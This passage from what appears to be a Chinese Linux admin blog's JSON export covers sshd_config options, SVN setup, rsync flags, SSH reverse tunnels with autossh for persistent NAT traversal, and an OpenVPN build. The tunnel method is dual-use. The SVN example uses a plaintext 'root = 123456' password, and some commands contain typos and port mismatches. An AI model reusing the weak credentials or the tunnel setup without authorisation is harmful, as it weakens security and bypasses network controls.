RhostsRSAAuthentication 或 #HostbasedAuthentication 过程中忽略用户的 ~/.ssh/known_hosts 文件。默认值是\"no\"。#为了提高安全性，可以设为\"yes\"。PermitEmptyPasswords no #是否允许密码为空的用户远程登录。默认为\"no\"。ChallengeResponseAuthentication no #是否允许质疑-应答(challenge-response)认 #证。默认值是\"yes\"，所有 login.conf中允许的认证方式都被支持。PasswordAuthentication yes # 是否允许使用基于密码的认证。默认为\"yes\"。KerberosAuthentication no #是否要求用户为 PasswordAuthentication 提供的密码#必须通 过 Kerberos KDC 认证，也就是是否使用Kerberos认证。使用Kerberos认证，服务器#需要一个可以校验 KDC identity 的 Kerberos servtab 。默认值是\"no\"。KerberosGetAFSToken no #如果使用了 AFS 并且该用户有一个 Kerberos 5 TGT，#那么开 启该指令后,将会在访问用户的家目录前尝试获取一个 AFS token 。默认为\"no\"。KerberosOrLocalPasswd yes #如果 Kerberos 密码认证失败，那么该密码还将要通过其它#的 认证机制(比如 /etc/passwd)。默认值为\"yes\"。KerberosTicketCleanup yes #是否在用户退出登录后自动销毁用户的 ticket 。默认#\"yes\"。GSSAPIAuthentication no #是否允许使用基于 GSSAPI 的用户认证。默认值为\"no\"。#仅用 于SSH-2。GSSAPICleanupCredentials yes #是否在用户退出登录后自动销毁用户凭证缓存。默认值 #是\"yes\"。仅用于SSH-2。X11Forwarding no #是否允许进行 X11 转发。默认值是\"no\"，设为\"yes\"表示允许。如果#允许X11转发并且sshd代理的显示区被配置为在含有通配符的地址(X11UseLocalhost)上监听。#那么将可能有额外的信息被泄漏。由于使用X11转发的可能带来的风险，此指令默认值为\"no\"。需#要注意的是，禁止X11转发并不能禁止用户转发X11通信，因为用户可以安装他们自己的转发器。如#果启用了 UseLogin ，那么X11转发将被自动禁止。X11DisplayOffset 10 #指定X11 转发的第一个可用的显示区(display)数字。默认值 #是 10 。这个可以用于防止 sshd 占用了真实的 X11 服务器显示区，从而发生混淆。PrintMotd no #登入后是否显示出一些信息呢？例如上次登入的时间、地点等#等，预设是 yes ，但是，如果为了安全，可以考虑改为 no ！PrintLastLog yes #指定是否显示最后一位用户的登录时间。默认值是\"yes\"TCPKeepAlive yes #指定系统是否向客户端发送 TCP keepalive 消息。默认值是\"yes\"#。这种消息可以检测到死连接、连接不当关闭、客户端崩溃等异常。可以设为\"no\"关闭这个特性。UseLogin no #是否在交互式会话的登录过程中使用 login。默认值是\"no\"。#如果开启此指令，那么 X11Forwarding 将会被禁止，因为 login 不知道如何处理 xauth #cookies 。需要注意的是，login是禁止用于远程执行命令的。如果指定了 #UsePrivilegeSeparation ，那么它将在认证完成后被禁用。MaxStartups 10 #最大允许保持多少个未认证的连接。默认值是 10 。到达限制后，#将不再接受新连接，除非先前的连接认证成功或超出 LoginGraceTime 的限制。MaxAuthTries 6 #指定每个连接最大允许的认证次数。默认值是 6 。如果失败认证的次数超#过这个数值的一半，连接将被强制断开，且会生成额外的失败日志消息。UseDNS no #指定是否应该对远程主机名进行反向解析，以检查此主机名是否与其IP#地址真实对应。Banner /etc/issue.net #将这个指令指定的文件中的内容在用户进行认证前显示给远程用户。#这个特性仅能用于SSH-2，默认什么内容也不显示。\"none\"表示禁用这个特性。Subsystem sftp /usr/lib/openssh/sftp-server #配置一个外部子系统(例如，一个文件#传输守 护进程)。仅用于SSH-2协议。值是一个子系统的名字和对应的命令行(含选项和参数)。UsePAM yes #是否使用PAM模块认证 解决SSH登陆缓慢 编辑SSHD_CONFIG文件，将UseDNS改为no， 关闭GSSAPIAuthentication no 检查/etc/hosts 查看ip映射 Server限制Ip登陆 /etc/hosts.deny 设置为 sshd: ALL: deny /etc/hosts.allow 设置ip访问： sshd : x.x.x.x : allow","categories":[{"name":"SSH","slug":"SSH","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/SSH/"},{"name":"工具篇","slug":"SSH/工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/SSH/工具篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"Linux-SVN部署","slug":"yunwei/Linux-SVN部署","date":"2018-03-11T10:09:55.000Z","updated":"2018-03-14T13:40:27.474Z","comments":true,"path":"2018/03/11/yunwei/Linux-SVN部署/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/11/yunwei/Linux-SVN部署/","excerpt":"​ SVN是Subversion的简称，是一个开放源代码的版本控制系统，相较于RCS、CVS，它采用了分支管理系统，它的设计目标就是取代CVS。互联网上很多版本控制服务已从CVS迁移到Subversion。说得简单一点SVN就是用于多个人共同开发同一个项目，共用资源的目的。 svn存储版本数据也有2种方式： BDB(一种事务安全型表类型) FSFS(一种不需要数据库的存储系统)。 因为BDB方式在服务器中断时，有可能锁住数据，所以还是FSFS方式更安全一点。 SVN安装 authz访问控制权限 备份还原","text":"​ SVN是Subversion的简称，是一个开放源代码的版本控制系统，相较于RCS、CVS，它采用了分支管理系统，它的设计目标就是取代CVS。互联网上很多版本控制服务已从CVS迁移到Subversion。说得简单一点SVN就是用于多个人共同开发同一个项目，共用资源的目的。 svn存储版本数据也有2种方式： BDB(一种事务安全型表类型) FSFS(一种不需要数据库的存储系统)。 因为BDB方式在服务器中断时，有可能锁住数据，所以还是FSFS方式更安全一点。 SVN安装 authz访问控制权限 备份还原 搭建svn服务器 安装subversion软件 Ubuntu/Debian 1sudo apt-get install subversion Redhat/CentOS 1yum install subversion 创建SVN仓库 1svnadmin create /home/svn/repos ##定义任何目录，前提有权限访问 修改/home/svn/repos/conf/svnserve.conf‘ 12345678#匿名访问的权限，可以是read,write,none,默认为read anon-access = none 认证用户的权限，可以是read,write,none,默认为write auth-access = write #密码数据库的路径，去掉前面的#password-db = passwd #访问控制文件 仓库目录访问权限authz-db = authz ​ 修改 /home/svn/repos/conf/passwd 12[users]root = 123456 #添加用户 以及 密码 ​ 修改 /home/svn/rpos/conf/authz 12345678910111213141516171819202122232425262728[aliases]# joe = /C=XZ/ST=Dessert/L=Snake City/O=Snake Oil, Ltd./OU=Research Institute/CN=Joe Average[groups]# harry_and_sally = harry,sally# harry_sally_and_joe = harry,sally,&amp;joeFA = lg,lgl,wyh[repository:/]root = rw* = r [repository:/AA]root = rwwyh = rwlgl = rw* =[repository:/BB/AGV]root = rwwyh = r lg = r* = [repository:/BB/GG]root = rwlg = rw* = 此时 root对所有目录都有读写权限 lg 对repository 有读权限; 对 repostitory/AA 没有任何权限; 对repostitory/BB/AGV 有读权限; 对repostitory/BB/GG 有读写权限 依次可以类推; ​ 启动Subversion服务器 1svnserve -d -r /home/svn/ ## --listen-host x.x.x.x ​ 停止Subversion服务器: 1$ killall -9 svnserve -d表示在后台运行 -r指定服务器的根服务 现在将可以直接使用 svn://ip/repos 访问 window客户端下载window-svn客户端下载 备份还原svn备份还原存在三种方式: dump hotcopy svnsync dump方法hotcopy 进行热备份和还原 备份方法: 12345$ svnadmin hotcopy /var/svn/lius/ ~/hotcopy.bak // 后面是要备份的路径, 是一个目录$ file ~/hotcopy.bak/root/hotcopy.bak: directory$ ls ~/hotcopy.bakconf db format hooks locks README.txt --clean-logs选项，是svnadmin执行热拷贝操作时，删除不用的Berkeley DB日志文件。 可以在任何时候运行这个命令得到一个版本库的安全拷贝，不管其它进程是否使用这个版本库。 还原: 12345$ svnadmin hotcopy ~/hotcopy.bak /var/svn/hotsvn ## 可以将被破坏的原有文件删除，重新还原为之前位置名字， 客户端即可实现同步; 即 rm- rf /var/svn/lius/ &amp;&amp; svnadmin hotcopy ~/hotcopy.bak /var/svn/lius/$ ls /var/svn/hotsvnconf db format hooks locks README.txt$ killall svnserve$ svnserve -d -r /var/svn/ ​ authz 访问控制权限","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"rsync","slug":"commands/rsync","date":"2018-03-11T10:08:25.000Z","updated":"2018-12-05T11:07:06.125Z","comments":true,"path":"2018/03/11/commands/rsync/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/11/commands/rsync/","excerpt":"rsync 介绍rsync是类unix系统下的数据镜像备份工具——remote sync。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。 它的特性如下： 可以镜像保存整个目录树和文件系统。 可以很容易做到保持原来文件的权限、时间、软硬链接等等。 无须特殊权限即可安装。 快速：第一次同步时 rsync 会复制全部内容，但在下一次只传输修改过的文件。rsync 在传输数据的过程中可以实行压缩及解压缩操作，因此可以使用更少的带宽。 安全：可以使用scp、ssh等方式来传输文件，当然也可以通过直接的socket连接。 支持匿名传输，以方便进行网站镜像。","text":"rsync 介绍rsync是类unix系统下的数据镜像备份工具——remote sync。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。 它的特性如下： 可以镜像保存整个目录树和文件系统。 可以很容易做到保持原来文件的权限、时间、软硬链接等等。 无须特殊权限即可安装。 快速：第一次同步时 rsync 会复制全部内容，但在下一次只传输修改过的文件。rsync 在传输数据的过程中可以实行压缩及解压缩操作，因此可以使用更少的带宽。 安全：可以使用scp、ssh等方式来传输文件，当然也可以通过直接的socket连接。 支持匿名传输，以方便进行网站镜像。 语法123456rsync [OPTION]... SRC DESTrsync [OPTION]... SRC [USER@]host:DESTrsync [OPTION]... [USER@]HOST:SRC DESTrsync [OPTION]... [USER@]HOST::SRC DESTrsync [OPTION]... SRC [USER@]HOST::DESTrsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync有六种不同的工作模式： 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号”:”分隔符时就启动这种工作模式。如：rsync -a /data /backup 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号”:”分隔符时启动该模式。如：rsync -avz *.c foo:src 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号”:”分隔符时启动该模式。如：rsync -avz foo:src/bar /data 从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含”::”分隔符时启动该模式。如：rsync -av root@192.168.78.192::www /databack 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含”::”分隔符时启动该模式。如：rsync -av /databack root@192.168.78.192::www 列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://192.168.78.192/www 使用技巧1$ rsync main.c user-b@machB:/home/dir 只要目的端的文件内容和源端不一样，就会触发数据同步，rsync会确保两边的文件内容一样。 但rsync不会同步文件的”modify time”，凡是有数据同步的文件，目的端的文件的”modify time”总是会被修改为最新时间。 rsync不会太关注目的端文件的rwx权限，如果目的端没有此文件，那么权限会保持与源端一致；如果目的端有此文件，则权限不会随着源端变更。 只要rsync对源文件有读权限，且对目标文件有写权限，rsync就能确保文件同步和源端保持一致 rsync只能以登陆目的端的账号来创建文件，他没有能力保持目的端文件的属主和属组 与 源端一致。 参数选项12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061-v, --verbose 详细模式输出。-q, --quiet 精简输出模式。-c, --checksum 打开校验开关，强制对文件传输进行校验。-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。-r, --recursive 对子目录以递归模式处理。 ##并对文件夹同步-R, --relative 使用相对路径信息。-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。--backup-dir 将备份文件(如~filename)存放在在目录下。-suffix=SUFFIX 定义备份文件前缀。-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。-l, --links 保留软链结。-L, --copy-links 想对待常规文件一样处理软链结。--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。--safe-links 忽略指向SRC路径目录树以外的链结。-H, --hard-links 保留硬链结。-p, --perms 保持文件权限。-o, --owner 保持文件属主信息。-g, --group 保持文件属组信息。-D, --devices 保持设备文件信息。-t, --times 保持文件时间信息。 ## 带有-t选项的rsync，同步前会先比对两侧文件的时间戳，不一致才会对比，但可能文件内容不同，时间戳一样。-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。-n, --dry-run现实哪些文件将被传输。-w, --whole-file 拷贝文件，不进行增量检测。-x, --one-file-system 不要跨越文件系统边界。-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。-e, --rsh=command 指定使用rsh、ssh方式进行数据同步。 ## 指定同步方式，进行安全传输;--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。--delete 删除那些DST中SRC没有的文件。--delete-excluded 同样删除接收端那些被该选项指定排除的文件。--delete-after 传输结束以后再删除。--ignore-errors 及时出现IO错误也进行删除。--max-delete=NUM 最多删除NUM个文件。--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。--force 强制删除目录，即使不为空。--numeric-ids 不将数字的用户和组id匹配为用户名和组名。--timeout=time ip超时时间，单位为秒。-I, --ignore-times 不跳过那些有同样的时间和长度的文件。 ## 配合-t使用，防止时间戳一致，但是内容不同文件--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。-T --temp-dir=DIR 在DIR中创建临时文件。--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。-P 等同于 --partial。--progress 显示备份过程。-z, --compress 对备份的文件在传输时进行压缩处理。 --exclude=PATTERN 指定排除不需要传输的文件模式。--include=PATTERN 指定不排除而需要传输的文件模式。--exclude-from=FILE 排除FILE中指定模式的文件。--include-from=FILE 不排除FILE指定模式匹配的文件。--version 打印版本信息。--address 绑定到特定的地址。--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。--port=PORT 指定其他的rsync服务端口。--blocking-io 对远程shell使用阻塞IO。-stats 给出某些文件的传输状态。--progress 在传输时现实传输过程。--log-format=formAT 指定日志文件格式。--password-file=FILE 从FILE中得到密码。--bwlimit=KBPS 限制I/O带宽，KBytes per second。-h, --help 显示帮助信息。","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"SSH反向隧道进行内网穿透","slug":"commands/SSH反向隧道进行内网穿透","date":"2018-03-10T13:34:48.000Z","updated":"2018-12-05T13:56:24.843Z","comments":true,"path":"2018/03/10/commands/SSH反向隧道进行内网穿透/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/10/commands/SSH反向隧道进行内网穿透/","excerpt":"​ 假设机器A和B， A有公网IP， B位于NAT之后并无可用的端口转发，现在想由A主动向B发起SSH链接请求。 如遇B在NAT之后，无可用 公网IP + 端口 来组合使用，所以A无法穿透NAT。 机器代号 机器位置 地址 账户 SSH/SSHD端口 是否需要运行SSHD A 位于公网 a.site user-a 22 是 B 位于NAT之后 b.site user-b 22 是 C 位于NAT之后 c.site user-c 22 否","text":"​ 假设机器A和B， A有公网IP， B位于NAT之后并无可用的端口转发，现在想由A主动向B发起SSH链接请求。 如遇B在NAT之后，无可用 公网IP + 端口 来组合使用，所以A无法穿透NAT。 机器代号 机器位置 地址 账户 SSH/SSHD端口 是否需要运行SSHD A 位于公网 a.site user-a 22 是 B 位于NAT之后 b.site user-b 22 是 C 位于NAT之后 c.site user-c 22 否 SSH主要参数1234567usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] [user@]hostname [command] -p 指定特定链接端口 1$ ssh -p 28392 root@a.site ​ -D 动态端口转发(Socket代理) 1$ ssh -D 1080 a.site # D is For Dynamic -D 是建立在TCP/IP应用层的动态端口转发。这条命令相当于监听本地1080端口作为SOCKS5代理服务器， 所有到该端口的请求都会被代理(转发)到a.site，就好像请求是从a.site发出一样。 ​ 访问原先本机无法访问而a.site可以访问的网络资源，不限协议(HTTP/SSH/FTP, Tcp/Udp) 。 ​ -L 本地端口转发 123主机B $ ssh -L 2222:localhost:22 a.sitessh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; ​ 该命令的作用是，绑定本机B 2222端口，当有到2222端口的链接时，该链接会经由安全通道(secure channel)转发到a.site，由a.site建立一个到 Localhost:2222 —-&gt; a.site:22 端口的链接 。 ​ -R 远程端口转发 1主机B $ ssh -R 8080:localhost:80 a.site 远程转发就是在SSH链接成功后，绑定目标主机的指定端口 8080, 并转发本地网络的 80端口。 如本机B 80端口存在HTTP服务。那么使用上述命令， 主机A即可在浏览器http://localhost:8080 访问主机B服务。 b:80 —-&gt; a.site:8080 与本地端口转发，转发方向相反。 ​ -W stdio转发(netcat模式) 与ProxyJump 1$ ssh -W localhost:23 a.site ​ netcat 模式可谓是SSH的杀手特性: 通过-W 参数开启到目标网络某主机和端口的stdio转发， 可以看做是组合netcat (nc) 和 ssh -L 。 上述命令相当于将本机的标准输入输出链接到了 a.site的telnet端口， 就像在a.site 上执行telnet localhost 一样, 而且不需要在本机运行telnet。 ​ 直接转发stdio，用来做ssh跳板。 ssh -W常被用来构建主机到主机的透明隧道代理，而在ProxyJump其实就是基于stdio转发做的简化，专门用于链式的SSH跳板。 -q: quiet模式，忽视大部分的警告和诊断信息（比如端口转发时的各种连接错误） -T: 禁用tty分配(pseudo-terminal allocation) -f: 登录成功后即转为后台任务执行 -N: 不执行远程命令（专门做端口转发） -n: 重定向stdin为/dev/null，用于配合-f后台任务 SSH 反向转发​ 实质是由B向A主动建立SSH转发，将A的6766端口转发到B的22端口上，只要这条转发不关闭，这个转发链路就是有效的。 有了此端口链路，只需要访问A的6766端口，即可实现反向链接B主机。 在B上建立一个SSH转发，将主机A的6766端口转发到主机B的22端口上: 1主机B: $ssh -p 22 -qTfNn -R 4444:localhost:22 47.104.84.21 -qTfNn用于告知ssh连接成功后就转到后台运行 -q: quiet模式，忽视大部分的警告和诊断信息（比如端口转发时的各种连接错误） -T: 禁用tty分配(pseudo-terminal allocation) -f: 登录成功后即转为后台任务执行 -N: 不执行远程命令（专门做端口转发） -n: 重定向stdin为/dev/null，用于配合-f后台任务 然后在主机A上利用6766端口反向SSH到主机B: 1主机A: $ssh -p 4444 user-b@localhost ​ 转发维持稳定性维持 ​ SSH链接时会超时关闭，如果链接关闭，那么转发将无法维持，那么A就无法利用反向转发穿透主机B 所在的NAT了。 ​ autossh 这个软件会在超时之后自动重新建立SSH转发，用于解决转发的稳定性问题。 Debian 系列下载&amp;&amp;安装 123git clone git://anonscm.debian.org/collab-maint/autossh.gitcd autossh./configure &amp;&amp; make &amp;&amp; make install ​ Redhat 系列下载&amp;&amp;安装 123git clone git://anonscm.debian.org/collab-maint/autossh.gitcd autossh./configure &amp;&amp; make &amp;&amp; make install ​ 操作 1主机B $ autossh -p 22 -M 4444 -NR 4444:localhost:22 user-a@a.site -M 参数指定的端口用来监听转发的状态，与端口转发无关。 之后可以在主机user-A 通过4444 端口访问主机B； 1主机A $ssh -p 4444 user-b@localhost 转发自动建立主机B 重启， 建立的转发就会失效， 因此需要在主机B启动时 默认启动autossh来建立SSH转发。 利用SSH反向转发，使用内网主机C SSH链接内网主机B; 首先在主机A上编辑 sshd 的配置文件 /etc/ssh/sshd_config, 将 GatewayPorts开关打开: 1GetewayPorts yes 然后重启sshd: 1主机A: $ sudo systemctl restart sshd 然后在主机B上对之前用的autossh指令略加修改: 1主机B $ autossh -p 22 -M 4444 -NR &apos;*:4444:localhost:22&apos; user-a@a.site 之后在主机C上利用主机A的4444端口SSH链接到B: 1主机C $ ssh -p 4444 user-b@a.site systemd 服务编写 开启公网 主机 A 上SSHD的autossh开关，并重启SSHD 创建主机B用户SSH密码，并上传主机A (用于自动链接) 12主机B $ ssh-keygen -t &apos;rsa&apos; -C &apos;user-b@b.site&apos;主机B $ ssh-copy-id user-a@a.site 该秘钥不需要设置密码 运行ssh-keygen指令时尽管一路回车，不要输入额外字符。 ​ 主机B配置service自启动文件 然后在主机B上创建以 user-b用户权限调用 aotussh 的service文件。 cat /lib/systemd/system/autossh.service 设置其权限为 644 12345678910111213[Unit]Description=Auto SSH TunnelAfter=network-online.target[Service]User=autosshType=simpleExecStart=/bin/autossh -p 22 -M 4444 -NR '*:6766:localhost:22' usera@a.site -i /home/autossh/.ssh/id_rsaExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always[Install]WantedBy=multi-user.targetWantedBy=graphical.target 在主机B上使其生效: 1主机B $ systemctl enable NetworkManager-wait-online 设置该服务自启动: 1主机B $ sudo systemctl enable autossh 此时即可在主机A上使用这条反向链路链接主机B 1主机A $ ssh -p 4444 user-b@localhost 或者主机C上直接穿透两层NAT转换， 直接SSH链接主机B 1主机C $ ssh -p 4444 user-b@a.site 应用场景公网A， 内网B， 内网C， B，C不在同一局域网， 进行SSH转发，B 链接C 123456789主机C $ ssh -p 28392 -qfNn -R 8834:localhost:22 root@45.78.55.192root@Kali:/var/log# ps -ef |grep sshroot 1009 960 0 Mar05 ? 00:00:04 /usr/bin/ssh-agent gnome-sessionroot 7068 1 0 Mar05 ? 00:00:11 sshd: root@pts/1root 30997 1 0 05:17 ? 00:00:00 /usr/sbin/sshd -Droot 32709 1 0 Mar05 ? 00:00:12 sshd: root@pts/3root 111145 1 0 20:21 ? 00:00:00 ssh -p 28392 -qfNn -R 8834:localhost:22 root@45.78.55.192root 111248 30997 0 20:22 ? 00:00:00 sshd: root@pts/4root 111399 32711 0 20:23 pts/3 00:00:00 grep ssh 然后在公网A查看 12345678910111213141516171819[root@pgunimation ssh]# netstat -anp | grep 28392tcp 0 0 0.0.0.0:28392 0.0.0.0:* LISTEN 13382/sshd [root@pgunimation ssh]# ssh -p 8834 root@localhostThe authenticity of host &apos;[localhost]:8834 ([127.0.0.1]:8834)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:kJ5gXQpOfCHHfFa3EW0uJKOpJcjRRdfIcNsClCaCed4.ECDSA key fingerprint is MD5:b1:71:01:bf:ed:ba:e3:ba:d0:8c:0c:97:68:fa:90:c0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;[localhost]:8834&apos; (ECDSA) to the list of known hosts.root@localhost&apos;s password: The programs included with the Kali GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Mar 7 05:12:40 2018 from ::1root@Kali:~# exit ## ---- 此处已经链接； 主机C执行命令 1主机C Postgres@sucro109:~$ ssh -p 8834 root@45.78.55.192 ## 进行链接主机B， 因为 8834即绑定主机B","categories":[{"name":"SSH","slug":"SSH","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/SSH/"},{"name":"工具篇","slug":"SSH/工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/SSH/工具篇/"}],"tags":[{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Centos 7 搭建OpenVpn","slug":"yunwei/Centos-7-搭建OpenVpn","date":"2018-03-06T14:41:05.000Z","updated":"2018-03-06T14:46:34.409Z","comments":true,"path":"2018/03/06/yunwei/Centos-7-搭建OpenVpn/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/06/yunwei/Centos-7-搭建OpenVpn/","excerpt":"12[root@pgunimation etc]# cat system-releaseCentOS Linux release 7.4.1708 (Core) 下载:下载OpenVPN源码包，下载地址：https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz 1curl https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz 下载OpenVPN证书制作工具EasyRSA，下载地址：https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz 1wget https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz","text":"12[root@pgunimation etc]# cat system-releaseCentOS Linux release 7.4.1708 (Core) 下载:下载OpenVPN源码包，下载地址：https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz 1curl https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz 下载OpenVPN证书制作工具EasyRSA，下载地址：https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz 1wget https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz 安装Openvpn安装依赖软件包 1yum -y install openssl openssl-devel pam pam-devel 安装Openvpn: 12345tar -xvf openvpn-2.4.0.tar.gzcd openvpn*./configure &amp;&amp; make &amp;&amp; make install mkdir /etc/openvpn # 创建配置文件存放目录 cp sample/sample-config-files/server.conf /etc/openvpn/server.conf # 从模板复制一份配置文件 异常问题: 但是在./configure时，出现异常: 123456789checking for LZ4_compress in -llz4... noLZ4 library not found.checking lz4.h usability... nochecking lz4.h presence... nochecking for lz4.h... noLZ4 headers not found.LZ4 library or header not found, using version in src/compat/compat-lz4.*checking git checkout... noconfigure: error: lzo enabled but missing lzo​ LZO 是致力于解压速度的一种数据压缩算法，LZO 是 Lempel-Ziv-Oberhumer 的缩写。这个算法是无损算法，参考实现程序是线程安全的。 1234567891011121314151617181920[root@pgunimation ~]# yum search lzoLoaded plugins: fastestmirrorLoading mirror speeds from cached hostfile * base: centos.s.uw.edu * elrepo-kernel: repos.lax-noc.com * extras: repos-lax.psychz.net * updates: centos-distro.cavecreek.net===================================================================================== N/S matched: lzo ======================================================================================lzo-devel.i686 : Development files for the lzo librarylzo-devel.x86_64 : Development files for the lzo librarylzo-minilzo.i686 : Mini version of lzo for apps which don&apos;t need the full versionlzo-minilzo.x86_64 : Mini version of lzo for apps which don&apos;t need the full versionlzo.i686 : Data compression library with very fast (de)compressionlzo.x86_64 : Data compression library with very fast (de)compressionlzop.x86_64 : Real-time file compressor Name and summary matches only, use &quot;search all&quot; for everything.[root@pgunimation ~]# yum -install lzo-devel.x86_64 ## 进行安装； 制作证书 制作根证书 123tar zxf EasyRSA-3.0.1.tgzcp -rf EasyRSA-3.0.1 /etc/openvpn/easy-rsacd /etc/openvpn/easy-rsa 1./easyrsa init-pki # 初始化证书目录pki 1./easyrsa build-ca nopass # 创建根证书，提示输入Common Name，名称随意，但是不能和服务端证书或客户端证书名称相同 1./easyrsa gen-dh # 生成Diffle Human参数，它能保证密钥在网络中安全传输 ​ 制作服务端证书 1./easyrsa build-server-full server nopass # server是服务端证书名称，可以用其它名称 ​ 制作客户端证书 1./easyrsa build-client-full client1 nopass # client1是客户端证书名称，可以用其它名称 服务端配置1234567891011121314151617181920212223local a.b.c.d # 填服务器真实IPport 1194proto tcpdev tunca /etc/openvpn/easy-rsa/pki/ca.crtcert /etc/openvpn/easyrsa/pki/issued/server.crtkey /etc/openvpn/easyrsa/pki/private/server.keydh /etc/openvpn/easyrsa/pki/dh.pemserver 10.8.1.0 255.255.255.0 # 给客户端分配的IP段ifconfig-pool-persist ipp.txt # 记录客户端和虚拟ip的映射关系，当客户端重新连接时依然被分配断开之前的IP地址push &quot;redirect-gateway def1 bypass-dhcp&quot; # 重定向客户端网关push &quot;dhcp-option DNS 8.8.8.8&quot; # 选择一个DNS，这里用Google的DNS示例client-to-clientkeepalive 10 120compress lz4-v2push &quot;compress lz4-v2&quot;user nobodygroup nobodypersist-keypersist-tunstatus /var/log/openvpn-status.loglog /var/log/openvpn.logverb 3 # 日志等级 开启路由转发支持，用 vi 编辑/etc/sysctl.conf文件，修改以下参数net.ipv4.ip_forward = 1执行下面命令使sysctl.conf配置文件生效并添加iptables转发规则 123sysctl -piptables -t nat -A POSTROUTING -s 10.8.1.0/24 -j MASQUERADEservice iptables save 启动OpenVpn服务 1/usr/local/openvpn/sbin/openvpn --config /etc/openvpn/server.conf &amp; 客户端配置123/etc/easy-rsa/pki/private/client1.key/etc/easy-rsa/pki/issued/client1.crt/etc/easy-rsa/pki/ca.crt Window - openvpn下载 新建OpenVpn配置文件: remote.ovpn: 12345678910clientdev tunproto tcpremote x.x.x.x 1194 # 填服务器真实IPpersist-keypersist-tunca ca.crtcert client1.crtkey client1.keyverb 3 # 日志等级 Linux[Ubuntu/Debain] 1apt-get install openvpn Linux[Centos-redhat] 客户端用户密码登陆 异常报警: Options error: --explicit-exit-notify can only be used with --proto udp 此选项只与udp协议配合使用，所以注释此选项; 123# Notify the client that when the server restarts so it# can automatically reconnect.#explicit-exit-notify 2 ##将其注释; ​ SIGUSR1[soft,connection-reset] received, client-instance restarting Connection reset, restarting 1234Tue Mar 6 01:37:05 2018 TCP connection established with [AF_INET]112.229.125.230:54212Tue Mar 6 01:37:05 2018 112.229.125.230:54212 TLS: Initial packet from [AF_INET]112.229.125.230:54212, sid=ea308b9b f142b5c9Tue Mar 6 01:37:05 2018 112.229.125.230:54212 Connection reset, restarting [-1]Tue Mar 6 01:37:05 2018 